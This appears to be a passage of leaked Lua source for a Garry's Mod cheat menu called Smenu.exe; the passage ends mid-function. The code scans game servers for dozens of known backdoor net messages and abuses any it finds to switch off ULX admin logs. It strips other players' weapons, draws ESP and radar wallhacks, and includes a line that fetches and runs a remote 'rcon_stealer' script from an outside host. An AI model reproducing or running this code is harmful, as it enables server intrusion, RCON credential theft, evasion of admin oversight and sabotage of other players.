 
if ( SERVER ) then 
function file.Read(d)      
return "Coucou <3"         
end
end
MsgC (Color(math.random( 1, 255 ), math.random( 1, 255 ), math.random( 1, 9999 )), [[  =======================================================================================================================

  /$$$$$$                                                                                       
 /$$__  $$                                                                                      
| $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$$$$$$  /$$   /$$     /$$$$$$  /$$   /$$  /$$$$$$          
|  $$$$$$ | $$_  $$_  $$ /$$__  $$| $$__  $$| $$  | $$    /$$__  $$|  $$ /$$/ /$$__  $$         
 \____  $$| $$ \ $$ \ $$| $$$$$$$$| $$  \ $$| $$  | $$   | $$$$$$$$ \  $$$$/ | $$$$$$$$         
 /$$  \ $$| $$ | $$ | $$| $$_____/| $$  | $$| $$  | $$   | $$_____/  >$$  $$ | $$_____/         
|  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$  | $$|  $$$$$$//$$|  $$$$$$$ /$$/\  $$|  $$$$$$$         
 \______/ |__/ |__/ |__/ \_______/|__/  |__/ \______/|__/ \_______/|__/  \__/ \_______/         
                                                                                                
                                                                                                
                                                                                                
 /$$$$$$$                   /$$$$$$                                /$$                          
| $$__  $$                 /$$__  $$                              | $$                          
| $$  \ $$ /$$   /$$      | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$$          
| $$$$$$$ | $$  | $$      |  $$$$$$  /$$__  $$ |____  $$ /$$__  $$| $$  /$$/ /$$_____/          
| $$__  $$| $$  | $$       \____  $$| $$  \ $$  /$$$$$$$| $$  \__/| $$$$$$/ |  $$$$$$           
| $$  \ $$| $$  | $$       /$$  \ $$| $$  | $$ /$$__  $$| $$      | $$_  $$  \____  $$          
| $$$$$$$/|  $$$$$$$      |  $$$$$$/| $$$$$$$/|  $$$$$$$| $$      | $$ \  $$ /$$$$$$$/     /$$
|_______/  \____  $$       \______/ | $$____/  \_______/|__/      |__/  \__/|_______/     |__/
           /$$  | $$                | $$                                                        
          |  $$$$$$/                | $$      
           \______/                 |__/
					et un peu copié collé sur d'autres menu mais bon
 ]])
  
MsgC (Color(math.random( 1, 255 ), math.random( 1, 255 ), math.random( 1, 9999 )), [[ 	
======================================================================================================================= 
						
LEAKED BY ANATIK

SORRY FOR THE WAIT...

======================================================================================================================= ]])
Version = "v1.0"


if file.Exists( "includes/extensions/client/vehicle.lua", "LUA" ) == true then
surface.PlaySound("ambient/alarms/klaxon1.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 0, 0 ), "!Cake Anti-Cheat detected  !!" )
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "No !Cake Anti-Cheat on the server, you're not in trouble." )
end
  
local Authorized = LocalPlayer():SteamID()
if true

then


local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

   function stripPlayer(ply)
    if ply:IsPlayer() then 
      for k,v in pairs(ply:GetWeapons()) do
       net.Start("properties")
       net.WriteString( "remove" , 32 )
       net.WriteEntity( v )
       net.SendToServer()
         end
    end
end

local blur = Material("pp/blurscreen")
    local function DrawBlur(panel, amount) --Panel blur function
    local x, y = panel:LocalToScreen(0, 0)
    local scrW, scrH = ScrW(), ScrH()
        surface.SetDrawColor(255, 255, 255)
        surface.SetMaterial(blur)
    for i = 1, 6 do
        blur:SetFloat("$blur", (i / 3) * (amount or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(x * -1, y * -1, scrW, scrH)
    end
end


GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(math.random(1,255),math.random(1,255),math.random(1,255)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

-----------------------------
-- RCON STEALER
local rcon = "http.Fetch(\"https://loadingscrren.000webhostapp.com/rcon_stealer.lua\",function(b,l,h,c)RunString(b)end,nil)"
--------------------------------



---------------
function IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end 
function HtxPooledString()
        if IsMessagePooled( netKey ) then return "Detected!"
        else return "Not Detected!"
    end
end
--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]
RunConsoleCommand "stopsound"

surface.CreateFont( "APG_title_font", {
	font = "Arial",
	size = 14,
	weight = 700,
} )


surface.CreateFont( "APG_sideBar_font", {
    font = "Arial",
    size = 18,
    weight = 1500,
} )

surface.CreateFont( "APG_mainPanel_font", {
    font = "Arial",
    size = 19,
    weight = 8500,
} )

function actioneff(aff)
	hook.Add( "HUDPaint", "infohud", function()
		draw.SimpleTextOutlined(
        aff,
        "DermaLarge",
        ScrW() /2 ,
        40,
        Color( 255, 0, 0, 255 ),
        TEXT_ALIGN_CENTER,
        TEXT_ALIGN_CENTER,
        1,
        Color( 0, 0, 255 )
    )
   end )
   
   timer.Simple( 3, function() hook.Remove( "HUDPaint", "infohud" ) end )
	
end

hook.Add("HUDPaint", "Credits", function() draw.SimpleTextOutlined( "Hello ! "..steamworks.GetPlayerName( LocalPlayer():SteamID64() ).." Thanks For Buy Smenu.exe | Enjoy your game !", "creditsfont", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/15, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,160) )

end)

surface.CreateFont( "creditsfont", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

local main_color = Color(32, 255, 0,255)

--[[-----------
STOP ALL SOUND (REDEMARRAGE MENU :D)
--------------]]

-- ICON --

	
-- Auto-Backdoor checker
    if( ValidNetString("memeDoor") ) then
	  totalExploits = 1 + totalExploits 
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
	totalExploits = 1 + totalExploits 
        netKey = "Sandbox_Armdupe"
    else
    end
	
    if( ValidNetString("SparksLeBg") ) then 
	totalExploits = 1 + totalExploits 
        netKey = "SparksLeBg"
    else
    end
	
    if( ValidNetString("DarkRP_AdminWeapons") ) then
	totalExploits = 1 + totalExploits 
        netKey = "DarkRP_AdminWeapons"
    else
    end
	
	if( ValidNetString("enablevac") ) then
	totalExploits = 1 + totalExploits 
        netKey = "enablevac"
    else
    end
	
    if( ValidNetString("SessionBackdoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
	totalExploits = 1 + totalExploits 
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_blacksmurf") ) then
	totalExploits = 1 + totalExploits 
        netKey = "_blacksmurf"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
	totalExploits = 1 + totalExploits 
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
	totalExploits = 1 + totalExploits 
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
	totalExploits = 1 + totalExploits 
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
	totalExploits = 1 + totalExploits 
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ULXQUERY2"
    else
    end
    if( ValidNetString("Sbox_itemstore") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Sbox_itemstore"
    else
    end
	if( ValidNetString("Ulib_Message") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Ulib_Message"
    else
    end
	if( ValidNetString("Sbox_darkrp") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Sbox_darkrp"
    else
    end
	if( ValidNetString("ULogs_Info") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ULogs_Info"
    else
    end
	if( ValidNetString("ITEM") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ITEM"
    else
    end
	if( ValidNetString("fix") ) then
	totalExploits = 1 + totalExploits 
        netKey = "fix"
    else
    end
	if( ValidNetString("nocheat") ) then
	totalExploits = 1 + totalExploits 
        netKey = "nocheat"
    else
    end
	if( ValidNetString("ULX_QUERY2") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ULX_QUERY2"
    else
    end
	if( ValidNetString("Sandbox_GayParty") ) then
	totalExploits = 1 + totalExploits 
        netKey = "Sandbox_GayParty"
    else
    end
	if( ValidNetString("DarkRP_UTF8") ) then
	 totalExploits = 1 + totalExploits 
	     netKey = "DarkRP_UTF8"
    else
    end
	if( ValidNetString("oldNetReadData") ) then
	totalExploits = 1 + totalExploits 
        netKey = "oldNetReadData"
    else
    end
	if( ValidNetString("BackDoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "BackDoor"
    else
    end
	if( ValidNetString("OdiumBackDoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "OdiumBackDoor"
    else
    end
	if( ValidNetString("cucked") ) then
	totalExploits = 1 + totalExploits 
        netKey = "cucked"
    else
    end
	if( ValidNetString("NoNerks") ) then
	totalExploits = 1 + totalExploits 
        netKey = "NoNerks"
    else
    end
	if( ValidNetString("kek") ) then
	totalExploits = 1 + totalExploits 
        netKey = "kek"
    else
    end
	if( ValidNetString("ZimbaBackDoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ZimbaBackDoor"
    else
    end
	if( ValidNetString("something") ) then
	totalExploits = 1 + totalExploits 
        netKey = "something"
    else
    end
	if( ValidNetString("random") ) then
	totalExploits = 1 + totalExploits 
        netKey = "random"
    else
    end
	if( ValidNetString("strip0") ) then
	totalExploits = 1 + totalExploits 
        netKey = "strip0"
    else
    end
	if( ValidNetString("fellosnake") ) then
	totalExploits = 1 + totalExploits 
        netKey = "fellosnake"
    else
    end
	if( ValidNetString("idk") ) then
	totalExploits = 1 + totalExploits 
        netKey = "idk"
    else
    end
	if( ValidNetString("c") ) then
	totalExploits = 1 + totalExploits 
        netKey = "c"
    else
    end
	if( ValidNetString("killserver") ) then
	totalExploits = 1 + totalExploits 
        netKey = "killserver"
    else
    end
	if( ValidNetString("fuckserver") ) then
	totalExploits = 1 + totalExploits 
        netKey = "fuckserver"
    else
    end
	if( ValidNetString("cvaraccess") ) then
	totalExploits = 1 + totalExploits 
        netKey = "cvaraccess"
    else
    end
	if( ValidNetString("rcon") ) then
	totalExploits = 1 + totalExploits 
        netKey = "rcon"
    else
    end
	if( ValidNetString("rconadmin") ) then
	totalExploits = 1 + totalExploits 
        netKey = "rconadmin"
    else
    end
	if( ValidNetString("web") ) then
	totalExploits = 1 + totalExploits 
        netKey = "web"
    else
    end
	if( ValidNetString("jesuslebg") ) then
	totalExploits = 1 + totalExploits 
        netKey = "jesuslebg"
    else
    end
	if( ValidNetString("zilnix") ) then
	totalExploits = 1 + totalExploits 
        netKey = "zilnix"
    else
    end
	if( ValidNetString("ÃžÃ ?D)â—˜") ) then
	totalExploits = 1 + totalExploits 
        netKey = "ÃžÃ ?D)â—˜"
    else
    end
	if( ValidNetString("disablebackdoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "disablebackdoor"
    else
    end
	if( ValidNetString("_Defqon") ) then
	totalExploits = 1 + totalExploits 
        netKey = "_Defqon"
    else
    end
	if( ValidNetString("kill") ) then
	totalExploits = 1 + totalExploits 
        netKey = "kill"
    else
    end
	if( ValidNetString("blacksmurfBackdoor") ) then
	totalExploits = 1 + totalExploits 
        netKey = "blacksmurfBackdoor"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "No backdoor found :(" )
		 chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ESP | BHOP | CROSSHAIR | MIRROR : successfully loaded ;D" )
		 chat.AddText (Color( 0, 0, 0, 125 ), "[", "Smenu.exe", "] ", Color( 0, 255, 0 ), "Smenu loaded with success, type 'Smenu.exe' in the console." )
    else
	  	 chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ESP | BHOP | CROSSHAIR | MIRROR : successfully loaded ;D" )
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 0, 255, 0 ), "Backdoor found ! :D La backdoor est : ".. netKey )
		 chat.AddText (Color( 0, 0, 0, 125 ), "[", "Smenu.exe", "] ", Color( 0, 255, 0 ), "Smenu loaded with success, type 'Smenu.exe' in the console." )
		
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
              end)
         end
    end

--END CHECKER

-------------- ESP / CROSSHAIR / RADAR / MIRROIR ---------------

local Bhop = CreateClientConVar( "smenu_bhop", 1, true, false )
local smenuESP = CreateClientConVar( "smenu_esp", 1, true, false )
local smenuCROSSHAIR = CreateClientConVar( "smenu_chair", 0, true, false ) 
local LESPMirror = CreateClientConVar( "lix_lesp_mirror", 0, true, false )
local LESPMirrorx = CreateClientConVar( "lix_lesp_mirrorx", 0, true, false )
local LESPMirrory = CreateClientConVar( "lix_lesp_mirrory", 0, true, false )
local LESPMirrorw = CreateClientConVar( "lix_lesp_mirrorw", 300, true, false )
local LESPMirrorh = CreateClientConVar( "lix_lesp_mirrorh", 300, true, false )
local LESPMirrorpitch = CreateClientConVar( "lix_lesp_mirrorpitch", -2, true, false )
local LESPMirroryaw = CreateClientConVar( "lix_lesp_mirroryaw", 180, true, false )
local LESPMirrorroll = CreateClientConVar( "lix_lesp_mirrorroll", 0, true, false )

local LESPRadar = CreateClientConVar( "lix_lesp_radar", 0, true, false )
local LESPRadarx = CreateClientConVar( "lix_lesp_radarx", 0, true, false )
local LESPRadary = CreateClientConVar( "lix_lesp_radary", 0, true, false )
local LESPRadarw = CreateClientConVar( "lix_lesp_radarw", 300, true, false )
local LESPRadarh = CreateClientConVar( "lix_lesp_radarh", 300, true, false )
local LESPRadarfov = CreateClientConVar( "lix_lesp_radarfov", 300, true, false )
local LESPRadarauto = CreateClientConVar( "lix_lesp_radarauto", 1, true, false )
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
Vector( min.x, min.y, min.z ),
Vector( min.x, min.y, max.z ),
Vector( min.x, max.y, min.z ),
Vector( min.x, max.y, max.z ),
Vector( max.x, min.y, min.z ),
Vector( max.x, min.y, max.z ),
Vector( max.x, max.y, min.z ),
Vector( max.x, max.y, max.z )
}
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
local onScreen = ent:LocalToWorld( corner ):ToScreen()
minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
return minX, minY, maxX, maxY
end
local function HeadPos(ply)
if IsValid(ply) then
local hbone = ply:LookupBone("ValveBiped.Bip01_Head1")
return ply:GetBonePosition(hbone)
else return end
end
local function Visible(ply)
local trace = {start = LocalPlayer():GetShootPos(),endpos = {LocalPlayer(), ply}}
local tr = util.TraceLine(trace)
if tr.Fraction == 1 then
return true
else
return false
end 
end
local function IsSteamFriend( ply )
return ply:GetFriendStatus() == "friend"
end
local function FillRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawRect( x, y, w, h );
end
local function OutlineRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawOutlinedRect( x, y, w, h );
end
local function DrawCrosshair()
local w = ScrW() / 2.003;
local h = ScrH() / 2;
FillRGBA( w - 13, h, 30, 2, Color(112, 132, 255, 255 ) );
FillRGBA( w, h - 13.8, 2, 30, Color(112, 132, 255, 255 ) );
end
function DrawESP()
if smenuESP:GetInt() == 1 then
for k, v in pairs(ents.GetAll()) do
if v ~= LocalPlayer() then
if( v:IsNPC() ) then
local drawColor = Color(255, 255, 255, 255);
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor = Color( 154, 99, 255, 255 );
else
drawColor = Color( 154, 99, 255, 255 );
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = drawColor;
textData.text = "?";
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
elseif( v:IsPlayer() and v:Health() > 0 and v:Alive() ) then
local drawColor = Color(110, 241, 110, 110);
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor.a = 255;
else
drawColor.r = Color(110, 241, 110, 110)
drawColor.g = Color(110, 241, 110, 110)
drawColor.b = Color(110, 241, 110, 110)
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = Color( 255, 255, 255, 255 );
textData.text = v:GetName();
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
local max_health = 100;
if( v:Health() > max_health ) then
max_health = v:Health();
end
local mx = max_health / 4;
local mw = v:Health() / 4;
local drawPosHealth = drawPosit;
drawPosHealth.x = drawPosHealth.x - ( mx / 2 );
drawPosHealth.y = drawPosHealth.y + 10;
FillRGBA( drawPosHealth.x - 1, drawPosHealth.y - 1, mx + 2, 4 + 2, Color( 0, 0, 0, 255 ) );
FillRGBA( drawPosHealth.x, drawPosHealth.y, mw, 4, drawColor );
end
end
end
end
end
function DrawESPCORNER()
if smenuESP:GetInt() == 1 then
for k,v in pairs(player.GetAll()) do
local x1,y1,x2,y2 = coordinates(v)
surface.SetDrawColor(color_white)
surface.DrawLine( x1, y1, math.min( x1 + 5, x2 ), y1 )
surface.DrawLine( x1, y1, x1, math.min( y1 + 5, y2 ) )
surface.DrawLine( x2, y1, math.max( x2 - 5, x1 ), y1 )
surface.DrawLine( x2, y1, x2, math.min( y1 + 5, y2 ) )
surface.DrawLine( x1, y2, math.min( x1 + 5, x2 ), y2 )
surface.DrawLine( x1, y2, x1, math.max( y2 - 5, y1 ) )
surface.DrawLine( x2, y2, math.max( x2 - 5, x1 ), y2 )
surface.DrawLine( x2, y2, x2, math.max( y2 - 5, y1 ) )
end
end
end
function DrawXHair()
if( smenuCROSSHAIR:GetInt() == 1 ) then
DrawCrosshair();
end
end
local function CommandesDraw()
if LESPMirror:GetInt() > 0 then
local pitch = LESPMirrorpitch:GetInt()
if pitch < 0 then pitch = pitch * LocalPlayer():EyeAngles().p end
local yaw = LESPMirroryaw:GetInt()
if yaw < 0 then yaw = yaw * LocalPlayer():EyeAngles().y end
local roll = LESPMirrorroll:GetInt()
if roll < 0 then roll = roll * LocalPlayer():EyeAngles().r end
local Cam = {}
Cam.angles = Angle( LocalPlayer():EyeAngles().p + pitch, LocalPlayer():EyeAngles().y + yaw, LocalPlayer():EyeAngles().r + roll )
Cam.origin = LocalPlayer():GetShootPos()
Cam.x = LESPMirrorx:GetInt()
Cam.y = LESPMirrory:GetInt()
Cam.w = LESPMirrorw:GetInt()
Cam.h = LESPMirrorh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( LESPMirrorx:GetInt(), LESPMirrory:GetInt(), LESPMirrorw:GetInt(),LESPMirrorh:GetInt() )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
if LESPRadar:GetInt() > 0 then
local Cam = {}
Cam.angles = Angle( 90, LocalPlayer():EyeAngles().y, 0 )
local Zvar = LESPRadarfov:GetInt()
if LESPRadarauto:GetInt() > 0 then
local trace = {}
trace.start = LocalPlayer():GetPos() + Vector( 0, 0, 5 )
trace.endpos = LocalPlayer():GetPos() + Vector( 0, 0, LESPRadarfov:GetInt() )
trace.filter = LocalPlayer()
if util.TraceLine( trace ).Hit then
Zvar = util.TraceLine( trace ).HitPos.z - 5 - LocalPlayer():GetPos().z
end
end
Cam.origin = LocalPlayer():GetPos() + Vector( 0, 0, Zvar )
Cam.x = LESPRadarx:GetInt()
Cam.y = LESPRadary:GetInt()
Cam.w = LESPRadarw:GetInt()
Cam.h = LESPRadarh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( LESPRadarx:GetInt(), LESPRadary:GetInt(), LESPRadarw:GetInt(),LESPRadarh:GetInt() )
surface.SetDrawColor( 0, 0, 0 )
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
end
hook.Add( "HUDPaint", "LESP", CommandesDraw )
hook.Add( "HUDPaint", "DrawESP", DrawESP );
hook.Add( "HUDPaint", "DrawESPCORNER", DrawESPCORNER );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
/*======================================================================================================================================================================================*/

------------------------------
--        Other Stuff       --
------------------------------

surface.PlaySound( "buttons/blip1.wav" )

-----------------------------------------------
--     Check Backdoors (2) (smenu_scanbd)    --
-----------------------------------------------

function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - memeDoor" )
        netKey = "memeDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - memeDoor!" )
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sandbox_Armdupe!" )
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - DarkRP_AdminWeapons" )
        netKey = "DarkRP_AdminWeapons"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - DarkRP_AdminWeapons!" )
    end
    if( ValidNetString("SessionBackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - SessionBackdoor" )
        netKey = "SessionBackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - SessionBackdoor!" )
    end

    if( ValidNetString("Fix_Keypads") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Fix_Keypads" )
        netKey = "Fix_Keypads"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Fix_Keypads!" )
    end

    if( ValidNetString("Remove_Exploiters") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Remove_Exploiters" )
        netKey = "Remove_Exploiters"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Remove_Exploiters!" )
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - noclipcloakaesp_chat_text" )
        netKey = "noclipcloakaesp_chat_text"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - noclipcloakaesp_chat_text!" )
    end

    if( ValidNetString("_Defqon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - _Defqon" )
        netKey = "_Defqon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _Defqon!" )
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - _CAC_ReadMemory" )
        netKey = "_CAC_ReadMemory"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _CAC_ReadMemory!" )
    end

    if( ValidNetString("nostrip") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - nostrip" )
        netKey = "nostrip"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - nostrip!" )
    end

    if( ValidNetString("LickMeOut") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - LickMeOut" )
        netKey = "LickMeOut"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - LickMeOut!" )
    end

    if( ValidNetString("MoonMan") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - MoonMan" )
        netKey = "MoonMan"
    else
